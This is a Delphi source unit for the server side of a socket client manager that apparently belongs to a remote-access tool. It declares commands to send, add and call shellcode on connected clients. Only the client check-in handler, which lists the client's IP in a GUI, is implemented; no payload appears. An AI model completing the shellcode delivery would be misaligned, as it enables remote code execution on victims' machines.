unit untClientObject;

interface

uses
  System.Win.ScktComp,
  Windows,
  Sysutils,
  CLasses,
  ComCtrls,
  untUtil;

const
  CMD_ONLINE = 0;
  CMD_SHELLCODE_QUESTION = 1;
  CMD_SHELLCODE_NEW = 2;
  CMD_SHELLCODE_ADD = 3;
  CMD_SHELLCODE_CALL = 4;

type
  TClientThread = class(TObject)
  private
    procedure ParsePacket(mBuff:Pointer; dwLen:Integer; bCMD:Byte);
  protected
  public
    Data:AnsiString;
    mySocket:TCustomWinsocket;
    lstItem:TListItem;
    constructor Create(CreateSuspended: Boolean);
    procedure Cleanup;
    procedure ReadData;
    function SendBuffer(bySocketCmd: Byte; lpszBuffer: Pointer; iBufferLen: Integer): Boolean;
  end;
implementation

uses Unit1;

procedure TClientThread.ParsePacket(mBuff:Pointer; dwLen:Integer; bCMD:Byte);
var
  lstTokens:TStringList;
  tempGUIString:String;
begin
  case bCMD of
    CMD_ONLINE:
      begin
        SetString(tempGUIString, PChar(mBuff), dwLen div 2);
        lstTokens := Explode('|', tempGUIString);
        if lstTokens.Count >= 2 then
        begin
          if not Assigned(Self.lstItem) then
          begin
            lstItem := Form1.Listview1.Items.Add;
            lstItem.Caption := mySocket.RemoteAddress;
            lstItem.ImageIndex := 0;
            lstItem.SubItems.Add(lstTokens[0]);
            lstItem.SubItems.Add(lstTokens[1]);
            lstItem.SubItems.Objects[0] := Self;
            SendBuffer(CMD_ONLINE,PChar('TEST'),10);
          end;
        end else begin
          mysocket.Close;
          exit;
        end;
      end;
  end;
end;

function TClientThread.SendBuffer(bySocketCmd: Byte; lpszBuffer: Pointer; iBufferLen: Integer): Boolean;
var
  lpszSendBuffer: Pointer;
  szSendBuffer: Array[0..2047] Of WideChar;
  iSendLen: Integer;
begin
  Result := False;
  ZeroMemory(@szSendBuffer, SizeOf(szSendBuffer));
  lpszSendBuffer := Pointer(DWORD(@szSendBuffer) + SizeOf(TSocketHeader));
  if ((iBufferLen > 0) and (lpszBuffer <> nil)) then
  begin
    CopyMemory(lpszSendBuffer, lpszBuffer, iBufferLen);
  end;
  with LPSocketHeader(@szSendBuffer)^ do
  begin
    dwPacketLen := iBufferLen;
    bCommand := bySocketCmd;
  end;
  Dec(DWORD(lpszSendBuffer));
  iBufferLen := iBufferLen + SizeOf(TSocketHeader);
  iSendLen := Self.mySocket.SendBuf(szSendBuffer, iBufferLen);
  if (iSendLen = iBufferLen) then
    Result := True;
  Sleep(0);
end;

procedure TClientThread.Cleanup;
begin
  lstItem.Delete;
end;

constructor TClientThread.Create;
begin
  mySocket := nil;
end;

procedure TClientThread.ReadData();
var
  DataSize, dwBuffLen: Cardinal;
  mData:AnsiString;
  bByte:Byte;
  LengthDataSize,LengthSocketData: integer;
  pSocketHeader:LPSocketHeader;
begin
  if mySocket = nil then exit;
  if mySocket.Data = nil then exit;

  if Data = '' then exit;
  pSocketHeader := @Data[1];
  DataSize := pSocketHeader.dwPacketLen;
  bByte := pSocketHeader.bCommand;
  Delete(Data,1, SizeOf(TSocketHeader));
  dwBuffLen := Length(Data);
  if DataSize > dwBuffLen then exit;
  mData := Copy(Data,1,DataSize);
  //Dec(DataSize);
  ParsePacket(@mData[1], DataSize, bByte);
  if Length(Data) > 0 then begin
    ReadData;
  end;
end;
end.
